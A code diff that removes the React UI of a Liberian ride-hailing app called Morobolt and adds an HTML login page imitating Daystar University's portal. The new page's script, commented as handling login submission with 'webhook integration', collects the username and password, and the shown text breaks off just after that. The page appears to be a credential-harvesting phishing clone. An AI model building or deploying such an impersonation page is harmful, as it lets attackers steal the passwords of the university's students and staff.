-const handleRideComplete = () => {
-clearInterval(etaRef.current);
-setRideState(“rating”);
-};
-
-const handleRating = (r) => {
-setRating(r);
-setTimeout(() => {
-setRideState(“idle”);
-setSelectedDrop(””);
-showToast(“🙏 Thanks for rating! Ride complete.”);
-}, 800);
-};
-
-const filteredLocations = LIBERIA_LOCATIONS.filter(l =>
-l.name.toLowerCase().includes(searchQuery.toLowerCase()) ||
-l.addr.toLowerCase().includes(searchQuery.toLowerCase())
-);
-
-const renderSplash = () => (
-<div className="splash">
-<div className="splash-logo">Moro<span>bolt</span></div>
-<div className="splash-tagline">Moving Liberia Forward 🇱🇷</div>
-<div className="splash-dot"/>
-</div>
-);
-
-const renderAuth = () => (
-<div className="auth-screen">
-<div className="auth-hero">
-<div className="auth-map-grid"/>
-<div className="auth-hero-content">
-<div className="auth-hero-title">
-Your ride,<br/><span className="highlight">Your Liberia</span>
-</div>
-<div className="auth-hero-sub">Safe, fast & affordable transport across Liberia</div>
-</div>
-</div>
-<div className="auth-body">
-{!showOtp ? (
-<>
-<div className="auth-tabs">
-<button className={`auth-tab ${authMode === "login" ? "active" : ""}`} onClick={() => setAuthMode(“login”)}>Sign In</button>
-<button className={`auth-tab ${authMode === "register" ? "active" : ""}`} onClick={() => setAuthMode(“register”)}>Register</button>
-</div>
-{authMode === “register” && (
-<>
-<div className="form-group">
-<label className="form-label">First Name</label>
-<input className=“form-input” placeholder=“James” value={firstName} onChange={e => setFirstName(e.target.value)}/>
-</div>
-<div className="form-group">
-<label className="form-label">Last Name</label>
-<input className=“form-input” placeholder=“Kollie” value={lastName} onChange={e => setLastName(e.target.value)}/>
-</div>
-</>
-)}
-<div className="form-group">
-<label className="form-label">Phone Number</label>
-<div className="phone-input-wrap">
-<div className="country-code">🇱🇷 +231</div>
-<input className=“form-input” placeholder=“770 000 000” type=“number” value={phone} onChange={e => setPhone(e.target.value)} style={{flex:1}}/>
-</div>
-</div>
-<button className="btn-primary" onClick={handleLogin}>
-{authMode === “login” ? “Continue →” : “Create Account →”}
-</button>
-<div className="divider">or continue with</div>
-<button className=“btn-secondary” onClick={() => showToast(“Google sign-in coming soon”)}>
-🌐 Continue with Google
-</button>
-</>
-) : (
-<>
-<div style={{textAlign:“center”, marginBottom:8}}>
-<div style={{fontSize:40,marginBottom:12}}>📱</div>
-<div style={{fontFamily:”‘Syne’,sans-serif”,fontSize:20,fontWeight:700}}>Verify your number</div>
-<div style={{color:COLORS.textMuted,fontSize:14,marginTop:6}}>
-Enter the 4-digit code sent to +231 {phone}
-</div>
-</div>
-<div className="otp-wrap">
-{otpValues.map((v, i) => (
-<input
-key={i}
-className=“otp-box”
-type=“number”
-maxLength={1}
-value={v}
-onChange={e => {
-const val = e.target.value.slice(-1);
-const arr = […otpValues];
-arr[i] = val;
-setOtpValues(arr);
-if (val && i < 3) document.getElementById(`otp-${i+1}`)?.focus();
-}}
-id={`otp-${i}`}
-/>
-))}
-</div>
-<button className="btn-primary" onClick={handleOtpVerify}>Verify & Continue →</button>
-<button className=“btn-secondary” onClick={() => { setShowOtp(false); setOtpValues([””,””,””,””]); }}>← Change Number</button>
-<div style={{textAlign:“center”,color:COLORS.textMuted,fontSize:13,marginTop:12}}>
-Didn’t receive code? <span style={{color:COLORS.primary,cursor:“pointer”}} onClick={() => showToast(“OTP resent!”)}>Resend</span>
-</div>
-</>
-)}
-</div>
-</div>
-);
-
-const renderMap = () => (
-<div className="map-screen">
-<div className="map-area">
-<MapBackground/>
-{/* Floating cars */}
-<div className=“map-car” style={{top:“35%”,left:“40%”}}>🚗</div>
-<div className=“map-car” style={{top:“55%”,left:“65%”,animationDelay:“1s”}}>🏍️</div>
-<div className=“map-car” style={{top:“25%”,left:“20%”,animationDelay:“2s”}}>🚗</div>
-{/* User marker */}
-<div className=“pulse-marker” style={{top:“50%”,left:“50%”,transform:“translate(-50%,-50%)”}}/>
-
-```
-    <div className="map-overlay-top">
-      <div className="greeting-bar">
-        <div>
-          <div className="greeting-text">Good morning 👋</div>
-          <div className="greeting-name">{firstName || "James"} {lastName || "Kollie"}</div>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Daystar University Login</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            background: linear-gradient(135deg, #1a3a5c 0%, #2a5f7a 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .login-container {
+            background: rgba(255, 255, 255, 0.95);
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
+            padding: 50px 40px 40px;
+            width: 100%;
+            max-width: 420px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.4);
+            transition: transform 0.3s ease;
+        }
+
+        .login-container:hover {
+            transform: translateY(-5px);
+        }
+
+        .university-name {
+            text-align: center;
+            font-size: 28px;
+            font-weight: 700;
+            color: #1a3a5c;
+            letter-spacing: 1px;
+            margin-bottom: 4px;
+        }
+
+        .university-name span {
+            color: #c9a84c;
+        }
+
+        .motto {
+            text-align: center;
+            font-size: 13px;
+            color: #5a7a8a;
+            letter-spacing: 2px;
+            font-weight: 300;
+            margin-bottom: 35px;
+            padding-bottom: 20px;
+            border-bottom: 2px solid #e8edf0;
+        }
+
+        .motto span {
+            font-weight: 600;
+            color: #2a5f7a;
+        }
+
+        .form-group {
+            margin-bottom: 22px;
+        }
+
+        .form-group label {
+            display: block;
+            font-size: 14px;
+            font-weight: 600;
+            color: #1a3a5c;
+            margin-bottom: 6px;
+            letter-spacing: 0.5px;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 14px 18px;
+            border: 2px solid #dce3e8;
+            border-radius: 12px;
+            font-size: 15px;
+            background: #f8fafc;
+            transition: all 0.3s ease;
+            color: #1a3a5c;
+        }
+
+        .form-group input:focus {
+            outline: none;
+            border-color: #c9a84c;
+            background: #ffffff;
+            box-shadow: 0 0 0 4px rgba(201, 168, 76, 0.15);
+        }
+
+        .form-group input::placeholder {
+            color: #a0b4c0;
+            font-weight: 300;
+        }
+
+        .login-btn {
+            width: 100%;
+            padding: 15px;
+            background: linear-gradient(135deg, #1a3a5c 0%, #2a5f7a 100%);
+            color: white;
+            border: none;
+            border-radius: 12px;
+            font-size: 17px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            letter-spacing: 1px;
+            margin-top: 6px;
+        }
+
+        .login-btn:hover {
+            transform: scale(1.01);
+            box-shadow: 0 8px 25px rgba(26, 58, 92, 0.35);
+        }
+
+        .login-btn:active {
+            transform: scale(0.98);
+        }
+
+        .footer-links {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 20px;
+            padding-top: 18px;
+            border-top: 1px solid #e8edf0;
+        }
+
+        .footer-links a {
+            color: #5a7a8a;
+            text-decoration: none;
+            font-size: 13px;
+            font-weight: 500;
+            transition: color 0.3s ease;
+        }
+
+        .footer-links a:hover {
+            color: #c9a84c;
+        }
+
+        .lang-select {
+            color: #5a7a8a;
+            font-size: 13px;
+            font-weight: 500;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .lang-select select {
+            border: none;
+            background: transparent;
+            color: #1a3a5c;
+            font-weight: 600;
+            font-size: 13px;
+            cursor: pointer;
+            padding: 4px;
+        }
+
+        .lang-select select:focus {
+            outline: none;
+        }
+
+        .cookie-notice {
+            text-align: center;
+            margin-top: 18px;
+            font-size: 11px;
+            color: #8aa0ae;
+            letter-spacing: 0.3px;
+        }
+
+        .cookie-notice a {
+            color: #2a5f7a;
+            text-decoration: none;
+            font-weight: 500;
+        }
+
+        .cookie-notice a:hover {
+            color: #c9a84c;
+        }
+
+        /* Responsive */
+        @media (max-width: 480px) {
+            .login-container {
+                padding: 35px 20px 30px;
+            }
+            .university-name {
+                font-size: 22px;
+            }
+            .motto {
+                font-size: 11px;
+                letter-spacing: 1px;
+            }
+            .form-group input {
+                padding: 12px 14px;
+                font-size: 14px;
+            }
+            .footer-links {
+                flex-wrap: wrap;
+                gap: 10px;
+                justify-content: center;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="login-container">
+        <!-- University Name -->
+        <div class="university-name">
+            DAYSTAR <span>UNIVERSITY</span>
         </div>
-        <button className="avatar-btn" onClick={() => setActiveTab("profile")}>
-          {(firstName || "J")[0].toUpperCase()}
-        </button>
-      </div>
-      <div className="search-box" onClick={() => { setShowDestination(true); setSearchStep(1); setSearchQuery(""); }}>
-        <span>📍</span>
-        <span className="search-box-text">Where to in Liberia?</span>
-        <span style={{color:COLORS.textMuted}}>→</span>
-      </div>
-    </div>
+        <div class="motto">
+            <span>Excellence</span> · Transformation · Servant-Leadership
+        </div>
 
-    {/* Quick actions floating */}
-    <div style={{position:"absolute",right:16,top:"50%",transform:"translateY(-50%)",display:"flex",flexDirection:"column",gap:8,zIndex:10}}>
-      {[{i:"🎯",t:"Center"},{i:"🚨",t:"SOS"},{i:"💬",t:"Chat"}].map(a => (
-        <button key={a.t} style={{
-          width:44,height:44,borderRadius:12,
-          background:"rgba(17,17,17,0.9)",
-          border:"1px solid var(--border)",
-          display:"flex",alignItems:"center",justifyContent:"center",
-          cursor:"pointer",fontSize:20,backdropFilter:"blur(10px)"
-        }} onClick={() => showToast(`${a.t} tapped`)}>
-          {a.i}
-        </button>
-      ))}
-    </div>
-  </div>
-
-  {/* Booking panel */}
-  {rideState === "idle" && (
-    <div className="booking-panel" style={{position:"relative",borderRadius:"24px 24px 0 0",maxHeight:"none"}}>
-      <div className="panel-handle"/>
-      {!selectedDrop ? (
-        <>
-          <div className="panel-title">Book a Ride</div>
-          <div className="location-inputs">
-            <div className="location-row" onClick={() => { setShowDestination(true); setSearchStep(0); setSearchQuery(""); }}>
-              <div className="location-dot dot-green"/>
-              <div>
-                <span className="location-label">Your location</span>
-                <span className="location-value">{selectedPickup}</span>
-              </div>
+        <!-- Login Form -->
+        <form id="loginForm" onsubmit="return handleLogin(event)">
+            <div class="form-group">
+                <label for="username">Username</label>
+                <input type="text" id="username" placeholder="Enter your username" required />
             </div>
-            <div className="location-connector" style={{marginLeft:21}}/>
-            <div className="location-row" onClick={() => { setShowDestination(true); setSearchStep(1); setSearchQuery(""); }}>
-              <div className="location-dot dot-orange"/>
-              <div>
-                <span className="location-label">Destination</span>
-                <span className="location-value" style={{color:selectedDrop?COLORS.text:COLORS.textMuted}}>
-                  {selectedDrop || "Where are you going?"}
-                </span>
-              </div>
+            <div class="form-group">
+                <label for="password">Password</label>
+                <input type="password" id="password" placeholder="Enter your password" required />
             </div>
-          </div>
-          {/* Quick destinations */}
-          <div className="section-title">Quick Places</div>
-          <div className="vehicle-scroll" style={{marginBottom:12}}>
-            {[{n:"Home",i:"🏠"},{n:"Office",i:"🏢"},{n:"Market",i:"🛒"},{n:"Airport",i:"✈️"},{n:"Hospital",i:"🏥"}].map(p => (
-              <div key={p.n} style={{
-                background:"var(--card)",border:"1.5px solid var(--border)",
-                borderRadius:12,padding:"10px 16px",minWidth:90,
-                cursor:"pointer",textAlign:"center",flexShrink:0
-              }} onClick={() => {
-                setSelectedDrop(`${p.n} - Monrovia`);
-                showToast(`📍 Going to ${p.n}`);
-              }}>
-                <div style={{fontSize:24,marginBottom:4}}>{p.i}</div>
-                <div style={{fontSize:13,fontWeight:600}}>{p.n}</div>
-              </div>
-            ))}
-          </div>
-        </>
-      ) : (
-        <>
-          <div className="panel-title">Choose Your Ride</div>
-          <div className="location-inputs" style={{marginBottom:12}}>
-            <div className="location-row">
-              <div className="location-dot dot-green"/>
-              <div><span className="location-label">From</span><span className="location-value">{selectedPickup}</span></div>
+            <button type="submit" class="login-btn">Log in</button>
+        </form>
+
+        <!-- Footer Links -->
+        <div class="footer-links">
+            <a href="#" id="lostPassword">Lost password?</a>
+            <div class="lang-select">
+                🌐
+                <select id="languageSelect">
+                    <option value="en">English (en)</option>
+                    <option value="sw">Kiswahili (sw)</option>
+                    <option value="fr">Français (fr)</option>
+                </select>
             </div>
-            <div className="location-connector" style={{marginLeft:21}}/>
-            <div className="location-row">
-              <div className="location-dot dot-orange"/>
-              <div><span className="location-label">To</span><span className="location-value">{selectedDrop}</span></div>
-            </div>
-          </div>
-
-          <div className="section-title">Vehicle Type</div>
-          <div className="vehicle-scroll">
-            {VEHICLE_TYPES.map(v => (
-              <div key={v.id} className={`vehicle-card ${selectedVehicle === v.id ? "selected" : ""}`} onClick={() => setSelectedVehicle(v.id)}>
-                <span className="vehicle-icon">{v.icon}</span>
-                <span className="vehicle-name">{v.name}</span>
-                <span className="vehicle-time">{v.time} away</span>
-                <span className="vehicle-price">{v.price}</span>
-              </div>
-            ))}
-          </div>
-
-          {/* Payment */}
-          <div className="promo-row" onClick={() => showToast("Change payment method")}>
-            <span className="promo-icon">{selectedPayment === "cash" ? "💵" : selectedPayment === "wallet" ? "👜" : "📱"}</span>
-            <span className="promo-text">
-              {selectedPayment === "cash" ? "Cash (LD)" : selectedPayment === "wallet" ? "Morobolt Wallet" : "Mobile Money"}
-            </span>
-            <span className="promo-arrow" onClick={e => {
-              e.stopPropagation();
-              const opts = ["cash","wallet","mobile"];
-              const cur = opts.indexOf(selectedPayment);
-              setSelectedPayment(opts[(cur+1)%opts.length]);
-            }}>⇄ Change</span>
-          </div>
-
-          <div className="promo-row" onClick={() => showToast("Enter promo code")}>
-            <span className="promo-icon">🎟️</span>
-            <span className="promo-text">Add promo code</span>
-            <span className="promo-arrow">→</span>
-          </div>
-
-          <button className="btn-primary" onClick={handleBookRide}>
-            Book {VEHICLE_TYPES.find(v=>v.id===selectedVehicle)?.name} — {VEHICLE_TYPES.find(v=>v.id===selectedVehicle)?.price}
-          </button>
-          <button className="btn-secondary" onClick={() => setSelectedDrop("")} style={{marginTop:8}}>Clear Destination</button>
-        </>
-      )}
-    </div>
-  )}
-
-  {rideState === "searching" && (
-    <div className="booking-panel" style={{position:"relative",borderRadius:"24px 24px 0 0",maxHeight:"none",textAlign:"center"}}>
-      <div className="panel-handle"/>
-      <div style={{fontSize:60,margin:"20px 0",animation:"carMove 1s ease-in-out infinite alternate"}}>🔍</div>
-      <div style={{fontFamily:"'Syne',sans-serif",fontSize:22,fontWeight:800,marginBottom:8}}>Finding your driver...</div>
-      <div style={{color:COLORS.textMuted,fontSize:14,marginBottom:24}}>Matching you with nearby drivers in Monrovia</div>
-      <div style={{display:"flex",gap:6,justifyContent:"center",marginBottom:24}}>
-        {[0,1,2].map(i => (
-          <div key={i} style={{
-            width:10,height:10,borderRadius:"50%",
-            background:COLORS.primary,
-            animation:`pulse 1s ease-in-out infinite ${i*0.3}s`
-          }}/>
-        ))}
-      </div>
-      <button onClick={() => { setRideState("idle"); showToast("Search cancelled"); }} style={{
-        background:"transparent",border:"1.5px solid var(--border)",
-        borderRadius:12,padding:"12px 24px",color:COLORS.textMuted,cursor:"pointer",fontSize:14
-      }}>Cancel</button>
-    </div>
-  )}
-
-  {rideState === "found" && (
-    <div className="booking-panel" style={{position:"relative",borderRadius:"24px 24px 0 0",maxHeight:"none"}}>
-      <div className="panel-handle"/>
-      <div className="eta-bar">
-        <span style={{fontSize:24}}>🚗</span>
-        <div className="eta-text">Driver arriving in <span className="eta-time">{eta} min</span></div>
-        <div className="tag-chip">On the way</div>
-      </div>
-      <div className="ride-card">
-        <div className="driver-row">
-          <div className="driver-avatar">👨</div>
-          <div className="driver-info">
-            <div className="driver-name">Emmanuel Doe</div>
-            <div className="driver-rating">⭐ 4.92 · 1,247 trips</div>
-            <div style={{fontSize:13,color:COLORS.textMuted,marginTop:2}}>Toyota Camry · Silver</div>
-          </div>
-          <div className="driver-plate">LD-4892</div>
         </div>
-        <div className="action-btns">
-          <button className="action-btn" onClick={() => showToast("📞 Calling driver...")}>
-            📞<span>Call</span>
-          </button>
-          <button className="action-btn" onClick={() => showToast("💬 Chat opened")}>
-            💬<span>Chat</span>
-          </button>
-          <button className="action-btn" onClick={() => showToast("🔗 Trip shared!")}>
-            🔗<span>Share</span>
-          </button>
-          <button className="action-btn" onClick={() => setShowCancel(true)}>
-            ✕<span>Cancel</span>
-          </button>
+
+        <!-- Cookies Notice -->
+        <div class="cookie-notice">
+            🍪 Cookies notice · <a href="#" id="cookiePolicy">Learn more</a>
         </div>
-      </div>
-      <button className="btn-secondary" onClick={() => showToast("🛡️ Safety features")}>🛡️ Safety & Emergency</button>
-    </div>
-  )}
-
-  {rideState === "inprogress" && (
-    <div className="booking-panel" style={{position:"relative",borderRadius:"24px 24px 0 0",maxHeight:"none"}}>
-      <div className="panel-handle"/>
-      <div className="eta-bar" style={{background:"rgba(255,109,0,0.1)",borderColor:"rgba(255,109,0,0.3)"}}>
-        <span style={{fontSize:24}}>🏁</span>
-        <div className="eta-text" style={{flex:1}}>In progress · Heading to {selectedDrop}</div>
-      </div>
-      <div className="ride-card">
-        <div className="driver-row">
-          <div className="driver-avatar">👨</div>
-          <div className="driver-info">
-            <div className="driver-name">Emmanuel Doe</div>
-            <div style={{fontSize:13,color:COLORS.textMuted}}>LD-4892 · Toyota Camry</div>
-          </div>
-          <div style={{textAlign:"right"}}>
-            <div style={{fontFamily:"'Syne',sans-serif",fontSize:18,fontWeight:800,color:COLORS.primary}}>
-              {VEHICLE_TYPES.find(v=>v.id===selectedVehicle)?.price}
-            </div>
-            <div style={{fontSize:12,color:COLORS.textMuted}}>{selectedPayment === "cash" ? "Pay Cash" : "Auto-charged"}</div>
-          </div>
-        </div>
-        <div className="action-btns">
-          <button className="action-btn" onClick={() => showToast("📞 Calling driver...")}>📞<span>Call</span></button>
-          <button className="action-btn" onClick={() => showToast("💬 Chat opened")}>💬<span>Chat</span></button>
-          <button className="action-btn" onClick={() => showToast("🔗 Trip shared!")}>🔗<span>Share</span></button>
-        </div>
-      </div>
-      <button className="btn-primary" onClick={handleRideComplete} style={{marginTop:4}}>✅ Arrive at Destination</button>
-    </div>
-  )}
-
-  {rideState === "rating" && (
-    <div className="booking-panel" style={{position:"relative",borderRadius:"24px 24px 0 0",maxHeight:"none",textAlign:"center"}}>
-      <div className="panel-handle"/>
-      <div style={{fontSize:60,marginBottom:12}}>👨</div>
-      <div style={{fontFamily:"'Syne',sans-serif",fontSize:22,fontWeight:800}}>Rate Emmanuel</div>
-      <div style={{color:COLORS.textMuted,fontSize:14,margin:"8px 0 20px"}}>How was your trip?</div>
-      <div style={{display:"flex",gap:8,justifyContent:"center",marginBottom:24}}>
-        {[1,2,3,4,5].map(r => (
-          <button key={r} onClick={() => handleRating(r)} style={{
-            fontSize:40, background:"none", border:"none", cursor:"pointer",
-            transition:"transform 0.1s", transform: r <= rating ? "scale(1.2)" : "scale(1)"
-          }}>
-            {r <= rating ? "⭐" : "☆"}
-          </button>
-        ))}
-      </div>
-      <div style={{display:"flex",flexWrap:"wrap",gap:8,justifyContent:"center",marginBottom:20}}>
-        {["Great driver","On time","Friendly","Clean car","Safe driving"].map(t => (
-          <span key={t} className="tag-chip" style={{cursor:"pointer"}} onClick={() => showToast(`✅ ${t}`)}>+ {t}</span>
-        ))}
-      </div>
-      <button className="btn-primary" onClick={() => handleRating(rating || 5)}>Submit Rating</button>
-      <button onClick={() => { setRideState("idle"); setSelectedDrop(""); }} style={{
-        background:"none",border:"none",color:COLORS.textMuted,cursor:"pointer",marginTop:12,fontSize:14
-      }}>Skip</button>
-    </div>
-  )}
-
-  {/* Destination search modal */}
-  {showDestination && (
-    <div className="modal-overlay" style={{alignItems:"flex-end"}} onClick={() => setShowDestination(false)}>
-      <div className="modal-sheet" style={{height:"80vh",display:"flex",flexDirection:"column"}} onClick={e=>e.stopPropagation()}>
-        <div style={{marginBottom:16}}>
-          <div style={{display:"flex",alignItems:"center",gap:12,marginBottom:12}}>
-            <button onClick={() => setShowDestination(false)} style={{background:"none",border:"none",color:COLORS.textMuted,cursor:"pointer",fontSize:20}}>✕</button>
-            <div style={{fontFamily:"'Syne',sans-serif",fontSize:18,fontWeight:700}}>
-              {searchStep === 0 ? "Change Pickup" : "Set Destination"}
-            </div>
-          </div>
-          <input
-            className="form-input"
-            placeholder={searchStep === 0 ? "Search pickup location..." : "Search destination in Liberia..."}
-            value={searchQuery}
-            onChange={e => setSearchQuery(e.target.value)}
-            autoFocus
-          />
-        </div>
-        <div style={{flex:1,overflowY:"auto"}}>
-          {filteredLocations.map((loc, i) => (
-            <div key={i} className="location-suggestion" onClick={() => {
-              if (searchStep === 0) setSelectedPickup(`${loc.name}, ${loc.addr}`);
-              else setSelectedDrop(`${loc.name}, ${loc.addr}`);
-              setShowDestination(false);
-              showToast(`📍 ${loc.name} selected`);
-            }}>
-              <div className="loc-icon">{loc.icon}</div>
-              <div>
-                <div className="loc-name">{loc.name}</div>
-                <div className="loc-addr">{loc.addr}</div>
-              </div>
-            </div>
-          ))}
-        </div>
-      </div>
-    </div>
-  )}
-
-  {/* Cancel modal */}
-  {showCancel && (
-    <div className="modal-overlay">
-      <div className="modal-sheet">
-        <div className="modal-title">Cancel Ride?</div>
-        <div className="modal-sub">Please select a reason for cancellation</div>
-        {["Driver is too far","Change of plans","Found another ride","Wrong location","Emergency"].map(r => (
-          <div key={r} className="cancel-reason" onClick={() => handleCancelRide()}>• {r}</div>
-        ))}
-        <button className="btn-danger" onClick={handleCancelRide}>Confirm Cancellation</button>
-        <button className="btn-secondary" onClick={() => setShowCancel(false)} style={{marginTop:8}}>Keep My Ride</button>
-      </div>
-    </div>
-  )}
-</div>
-```
-
-);
-
-const renderActivities = () => (
-<>
-<div className=“screen-header” style={{padding:“20px 20px 16px”}}>
-<div className="screen-title">My Trips</div>
-<div className="screen-sub">{PAST_TRIPS.length} trips in Liberia</div>
-</div>
-<div className="screen-body">
-{/* Stats */}
-<div style={{display:“flex”,gap:10,marginBottom:20}}>
-{[{l:“Total Trips”,v:“47”,i:“🚗”},{l:“Distance”,v:“284 km”,i:“📍”},{l:“Spent”,v:“LD 14,500”,i:“💵”}].map(s => (
-<div key={s.l} style={{flex:1,background:“var(–card)”,borderRadius:12,padding:“12px 10px”,textAlign:“center”}}>
-<div style={{fontSize:24,marginBottom:4}}>{s.i}</div>
-<div style={{fontFamily:”‘Syne’,sans-serif”,fontWeight:800,fontSize:16}}>{s.v}</div>
-<div style={{fontSize:11,color:COLORS.textMuted}}>{s.l}</div>
-</div>
-))}
-</div>
-{PAST_TRIPS.map((trip, i) => (
-<div key={i} className=“trip-item” onClick={() => showToast(“Trip details”)}>
-<div className="trip-icon">{trip.icon}</div>
-<div className="trip-info">
-<div className="trip-route">{trip.from} → {trip.to}</div>
-<div className="trip-date">{trip.date}</div>
-<span className={`trip-status ${trip.status === "completed" ? "status-completed" : "status-cancelled"}`}>
-{trip.status === “completed” ? “✓ Completed” : “✕ Cancelled”}
-</span>
-</div>
-<div style={{textAlign:“right”}}>
-<div className="trip-price">{trip.price}</div>
-<div style={{fontSize:12,color:COLORS.textMuted,marginTop:4}}>Rebook</div>
-</div>
-</div>
-))}
-</div>
-</>
-);
-
-const renderWallet = () => (
-<>
-<div className="screen-header">
-<div className="screen-title">Wallet</div>
-<div className="screen-sub">Manage your Morobolt balance</div>
-</div>
-<div className="screen-body">
-<div className="wallet-card">
-<div className="wallet-label">Morobolt Balance</div>
-<div className="wallet-balance"><span className="wallet-currency">LD </span>5,200</div>
-<div style={{fontSize:12,color:“rgba(255,255,255,0.6)”,marginTop:4}}>≈ $28.50 USD</div>
-<div className="wallet-actions">
-<button className=“wallet-action-btn” onClick={() => showToast(“💳 Top up coming soon”)}>+ Top Up</button>
-<button className=“wallet-action-btn” onClick={() => showToast(“💸 Transfer coming soon”)}>→ Transfer</button>
-<button className=“wallet-action-btn” onClick={() => showToast(“📊 Statement downloaded”)}>📊 Statement</button>
-</div>
-</div>
-
-```
-    <div className="section-title">Payment Methods</div>
-    {[
-      {id:"cash",icon:"💵",label:"Cash (Liberian Dollar)",detail:"Pay driver directly"},
-      {id:"mobile",icon:"📱",label:"MTN Mobile Money",detail:"+231 770 *** ***"},
-      {id:"wallet",icon:"👜",label:"Morobolt Wallet",detail:"LD 5,200 available"},
-      {id:"card",icon:"💳",label:"Visa Card",detail:"**** **** **** 4291"},
-    ].map(p => (
-      <div key={p.id} className={`payment-option ${selectedPayment === p.id ? "selected" : ""}`} onClick={() => setSelectedPayment(p.id)}>
-        <span className="payment-icon">{p.icon}</span>
-        <div style={{flex:1}}>
-          <div className="payment-label">{p.label}</div>
-          <div className="payment-detail">{p.detail}</div>
-        </div>
-        {selectedPayment === p.id && <span className="payment-check">✓</span>}
-      </div>
-    ))}
-
-    <div style={{marginTop:20}}>
-      <div className="section-title">Recent Transactions</div>
-      {[
-        {d:"Ride payment · Emmanuel D.",a:"-LD 350",t:"Today 09:14"},
-        {d:"Top up via MTN Money",a:"+LD 2,000",t:"Feb 22"},
-        {d:"Ride payment · Grace K.",a:"-LD 150",t:"Feb 21"},
-        {d:"Promo bonus",a:"+LD 500",t:"Feb 20"},
-      ].map((tx,i) => (
-        <div key={i} style={{display:"flex",alignItems:"center",padding:"12px 0",borderBottom:"1px solid var(--border)"}}>
-          <div style={{flex:1}}>
-            <div style={{fontSize:14,fontWeight:500}}>{tx.d}</div>
-            <div style={{fontSize:12,color:COLORS.textMuted}}>{tx.t}</div>
-          </div>
-          <div style={{fontFamily:"'Syne',sans-serif",fontWeight:700,color:tx.a.startsWith("+") ? COLORS.success : COLORS.text}}>
-            {tx.a}
-          </div>
-        </div>
-      ))}
-    </div>
-  </div>
-</>
-```
-
-);
-
-const renderSafety = () => (
-<>
-<div className="screen-header">
-<div className="screen-title">Safety Center</div>
-<div className="screen-sub">Your safety is our priority</div>
-</div>
-<div className="screen-body">
-<button className=“sos-btn” onClick={() => showToast(“🚨 SOS alert sent to emergency contacts!”)}>
-🚨 SOS — Emergency
-</button>
-<div style={{color:COLORS.textMuted,fontSize:12,textAlign:“center”,margin:“8px 0 20px”}}>
-Hold to call emergency services (911) and notify your contacts
-</div>
-
-```
-    <div className="section-title">Safety Features</div>
-    {[
-      {icon:"📍",color:"blue",title:"Live Trip Sharing",desc:"Share your real-time location with trusted contacts during every trip"},
-      {icon:"🛡️",color:"green",title:"Driver Verification",desc:"All Morobolt drivers are background-checked and verified"},
-      {icon:"📹",color:"yellow",title:"In-App Camera",desc:"Record your trip for added safety and evidence if needed"},
-      {icon:"📞",color:"red",title:"Anonymous Calling",desc:"Call your driver without revealing your real phone number"},
-      {icon:"👤",color:"blue",title:"Trusted Contacts",desc:"Add up to 5 emergency contacts who can track your trips"},
-      {icon:"⭐",color:"green",title:"Rate & Report",desc:"Report any safety concern after every trip"},
-    ].map((s,i) => (
-      <div key={i} className="safety-card" onClick={() => showToast(`${s.title} feature`)}>
-        <div className={`safety-icon ${s.color}`}>{s.icon}</div>
-        <div>
-          <div className="safety-title">{s.title}</div>
-          <div className="safety-desc">{s.desc}</div>
-        </div>
-      </div>
-    ))}
-
-    <div className="section-title" style={{marginTop:20}}>Emergency Contacts (Liberia)</div>
-    {[
-      {name:"Liberia National Police",num:"911"},
-      {name:"ELWA Hospital",num:"+231 77 779-3333"},
-      {name:"JFK Medical Center",num:"+231 77 778-7777"},
-    ].map((c,i) => (
-      <div key={i} style={{display:"flex",alignItems:"center",padding:"14px 16px",background:"var(--card)",borderRadius:12,marginBottom:8}}>
-        <div style={{flex:1}}>
-          <div style={{fontWeight:600,fontSize:15}}>{c.name}</div>
-          <div style={{color:COLORS.primary,fontFamily:"'Syne',sans-serif",fontWeight:700}}>{c.num}</div>
-        </div>
-        <button style={{background:"var(--surface)",border:"none",borderRadius:10,padding:"8px 14px",color:COLORS.primary,cursor:"pointer",fontSize:13,fontWeight:600}} onClick={() => showToast(`📞 Calling ${c.name}...`)}>
-          Call
-        </button>
-      </div>
-    ))}
-  </div>
-</>
-```
-
-);
-
-const renderProfile = () => (
-<>
-<div className="profile-hero">
-<div className="profile-avatar">{(firstName||“J”)[0]}</div>
-<div>
-<div className="profile-name">{firstName || “James”} {lastName || “Kollie”}</div>
-<div className="profile-phone">+231 {phone || “770 000 000”}</div>
-<div className="profile-rating">⭐ 4.9 rating · Verified rider</div>
-</div>
-</div>
-
-```
-  <div className="settings-list">
-    {/* Promo banner */}
-    <div className="promo-banner" style={{marginBottom:20}}>
-      <div className="promo-banner-title">First Ride Free!</div>
-      <div className="promo-banner-sub">Get your first Morobolt ride at no charge</div>
-      <div className="promo-code">MORO2024</div>
     </div>
 
-    <div className="settings-section">
-      <div className="settings-section-title">Account</div>
-      {[
-        {icon:"👤",text:"Edit Profile"},
-        {icon:"📍",text:"Saved Places",badge:3},
-        {icon:"🔔",text:"Notifications"},
-        {icon:"🔒",text:"Privacy & Security"},
-      ].map(item => (
-        <div key={item.text} className="settings-item" onClick={() => showToast(`${item.text} opened`)}>
-          <span className="settings-item-icon">{item.icon}</span>
-          <span className="settings-item-text">{item.text}</span>
-          {item.badge && <span className="settings-item-badge">{item.badge}</span>}
-          <span className="settings-item-arrow">›</span>
-        </div>
-      ))}
-    </div>
+    <script>
+        // Handle login form submission with webhook integration
+        function handleLogin(e) {
+            e.preventDefault();
+            const username = document.getElementById('username').value.trim();
+            const password = document.getElementById('password').value.trim();
 
-    <div className="settings-section">
-      <div className="settings-section-title">Ride Preferences</div>
-      {[
-        {icon:"🎵",text:"Music Preference"},
-        {icon:"❄️",text:"AC Preference"},
-        {icon:"🗣️",text:"Conversation Level"},
-        {icon:"🧳",text:"Luggage Assistance"},
-      ].map(item => (
-        <div key={item.text} className="settings-item" onClick={() => showToast(`${item.text} set`)}>
